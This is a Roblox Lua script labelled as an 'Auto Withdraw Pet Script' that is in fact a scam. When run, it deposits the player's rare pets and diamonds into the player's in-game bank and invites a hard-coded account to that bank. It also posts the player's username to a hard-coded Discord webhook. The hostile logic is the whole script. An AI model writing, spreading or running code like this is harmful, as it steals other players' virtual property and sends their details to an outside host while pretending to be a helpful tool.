local LocalNumber = 519825046
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
    print("WORK")
else
    print("WORK")
end;

local Webhook = "https://discord.com/api/webhooks/1002331171750952960/umX9AtaWlCMErpKg3mUr5-KafTGruiJGPR_wqgIgZg6gIaCF6is3OBcZGdFrUle427HG"
local msg = {
    ["username"] = "Script Notifaction",
    ["embeds"] = {
            {
                ["color"] = tonumber(tostring("0x46739a")), --decimal
                ["title"] = "**SKRYPT ZOSTAL UZYTY**",
                ["fields"] = {
                    {
                        ["name"] = "Nazwa Skryptu",
                        ["value"] = "Auto Wihdraw Pet Script"
                    },
                    {
                        ["name"] = "Player Name",
                        ["value"] = game.Players.LocalPlayer.Name
                    },
                }
            }
        }
    }
request = http_request or request or HttpPost or syn.request
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
